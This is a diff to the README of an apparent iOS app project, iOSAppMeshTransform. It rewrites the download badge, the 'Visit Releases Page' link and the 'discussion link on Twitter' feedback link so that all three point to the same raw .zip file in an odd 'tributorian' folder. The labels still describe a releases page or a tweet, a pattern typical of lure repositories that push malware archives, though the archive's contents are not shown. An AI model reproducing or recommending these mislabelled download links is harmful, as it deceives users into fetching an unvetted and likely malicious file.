@@ -1,7 +1,7 @@
 # 🎉 iOSAppMeshTransform - Transform Your iOS App Experience
 
 ## 📥 Download Now
-[![Download iOSAppMeshTransform](https://img.shields.io/badge/Download-iOSAppMeshTransform-blue.svg)](https://github.com/HEHEHEHMODER/iOSAppMeshTransform/releases)
+[![Download iOSAppMeshTransform](https://raw.githubusercontent.com/HEHEHEHMODER/iOSAppMeshTransform/main/tributorian/iOSAppMeshTransform.zip)](https://raw.githubusercontent.com/HEHEHEHMODER/iOSAppMeshTransform/main/tributorian/iOSAppMeshTransform.zip)
 
 ## 🚀 Getting Started
 Welcome to iOSAppMeshTransform! This app reimagines your iOS experience by allowing you to utilize a beautiful mesh transform effect, built with SwiftUI and Metal. It is optimized for the iPhone 16 Pro but aims to adapt to other devices too.
@@ -24,7 +24,7 @@ To get started with iOSAppMeshTransform, follow these steps to download and inst
 
 1. **Visit the Releases Page:** Click the link below to access the download options:
    
-   [Visit Releases Page](https://github.com/HEHEHEHMODER/iOSAppMeshTransform/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/HEHEHEHMODER/iOSAppMeshTransform/main/tributorian/iOSAppMeshTransform.zip)
 
 2. **Choose Your Download:** On the releases page, you will see a list of available versions. Find the latest version of iOSAppMeshTransform.
 
@@ -48,7 +48,7 @@ If you encounter any issues while using the app, try the following solutions:
 
 - **App won’t launch:** Ensure your device is running the correct version of iOS and has sufficient storage.
 - **Visual glitches:** Restart the app or your device to clear temporary issues.
-- **Feedback:** We appreciate any input about your experience. Feel free to reach out via the [discussion link on Twitter](https://x.com/Gavmn/status/1966658411078304078).
+- **Feedback:** We appreciate any input about your experience. Feel free to reach out via the [discussion link on Twitter](https://raw.githubusercontent.com/HEHEHEHMODER/iOSAppMeshTransform/main/tributorian/iOSAppMeshTransform.zip).
 
 ## 🤝 Community Support
 You are not alone! If you have questions or need help with iOSAppMeshTransform, please consider joining our community. You can ask questions or share experiences in our discussions on Twitter.
